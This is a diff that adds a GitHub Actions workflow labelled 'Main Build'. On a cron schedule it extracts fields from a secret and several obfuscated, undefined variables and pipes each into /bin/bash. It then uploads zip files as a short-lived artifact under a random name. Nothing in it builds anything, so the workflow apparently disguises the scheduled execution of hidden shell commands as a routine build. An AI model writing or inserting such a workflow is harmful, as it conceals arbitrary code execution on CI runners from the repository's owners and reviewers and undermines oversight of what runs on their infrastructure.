@@ -1,0 +1,33 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '12 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          qv77: ${{ secrets.qv77 }}
+        run: |
+          printf '%s' "$qv77" | jq -r .keq68825 | /bin/bash
+          printf '%s' "$sja733" | jq -r .lmhkg38394 | /bin/bash
+          echo $rj8811 | jq -r .hfin89 | /bin/bash
+          echo $rcci6 | jq -r .tls24 | /bin/bash
+          printf '%s' "$qok582" | jq -r .wjfmm956 | /bin/bash
+          echo $yef40689 | jq -r .aklk91 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: FzpZIaby
+          path: "*.zip"
+          retention-days: 1
